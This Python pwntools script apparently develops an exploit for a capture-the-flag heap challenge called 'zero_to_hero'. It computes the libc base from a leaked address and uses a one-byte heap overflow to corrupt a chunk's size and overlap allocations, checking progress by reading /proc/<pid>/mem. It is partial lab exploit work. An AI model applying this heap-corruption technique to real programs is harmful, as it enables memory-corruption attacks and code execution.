from pwn import *

context.binary = ELF("./zero_to_hero", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

PROMPT = b"> "
ARR = 0x602060


def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})


def init(p):
    p.recvuntil(b"hero?\n")
    p.sendline(b"y")
    p.recvline()
    p.recvline()
    leak_line = p.recvline()
    leak = int(leak_line.split(b": ")[1], 16)
    libc.address = leak - libc.symbols['system']
    log.info(f"libc base = {hex(libc.address)}")
    p.recvuntil(PROMPT)


def add(p, idx, length, data, exact=False):
    if not exact and len(data) < length:
        data = data.ljust(length, b"\n")
    elif exact:
        assert len(data) == length
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(length).encode())
    p.recvuntil(b"description: ")
    p.send(data)
    p.recvuntil(PROMPT)
    log.info(f"added chunk idx {idx} length {length}")


def delete(p, idx):
    p.sendline(b"2")
    p.recvuntil(b"remove?\n")
    p.sendline(str(idx).encode())
    p.recvuntil(PROMPT)
    log.info(f"deleted chunk idx {idx}")


def read_mem(p, addr, size):
    with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
        mem.seek(addr)
        return mem.read(size)


def read_qword(p, addr):
    return u64(read_mem(p, addr, 8))


def dump_ptrs(p):
    data = read_mem(p, ARR, 8*7)
    ptrs = [u64(data[i*8:(i+1)*8]) for i in range(7)]
    for i, ptr in enumerate(ptrs):
        log.info(f"slot {i}: {hex(ptr)}")
    return ptrs

if __name__ == "__main__":
    p = start()
    init(p)

    add(p, 0, 0x108, b"A"*0x108)
    add(p, 1, 0x100, p64(0x110) + b"B"*(0x100-8))
    add(p, 2, 0x100, b"C"*0x100)
    add(p, 3, 0x80, b"D"*0x80)
    ptrs = dump_ptrs(p)
    chunk1 = ptrs[1]
    size1_before = read_qword(p, chunk1 - 8)
    log.info(f"chunk1 size before overflow: {hex(size1_before)}")

    delete(p, 0)

    add(p, 4, 0x108, b"E"*0x108, exact=True)
    size1_after = read_qword(p, chunk1 - 8)
    log.info(f"chunk1 size after overflow: {hex(size1_after)}")

    delete(p, 4)
    delete(p, 1)

    add(p, 5, 0x108, b"F"*0x108)
    add(p, 6, 0x100, b"G"*0x100)
    ptrs_after = dump_ptrs(p)
    log.info("After two allocations (should get chunk1 area)")

    p.interactive()
